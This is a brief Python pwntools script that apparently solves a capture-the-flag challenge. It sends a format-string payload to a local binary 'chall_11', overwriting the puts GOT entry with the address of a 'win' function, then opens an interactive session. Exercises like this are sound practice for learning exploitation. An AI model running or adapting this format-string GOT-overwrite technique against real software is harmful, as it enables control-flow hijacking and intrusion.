import pwn

pwn.context.arch = 'amd64'
elf = pwn.context.binary = pwn.ELF("./chall_11")

offset = 7
payload = pwn.fmtstr_payload(offset,{elf.got.puts:elf.sym.win}) # new toy!

p = pwn.process(elf.path)

output = p.recvuntil(b"Write what wear pants please")
print(output)

p.sendline(payload)

p.interactive()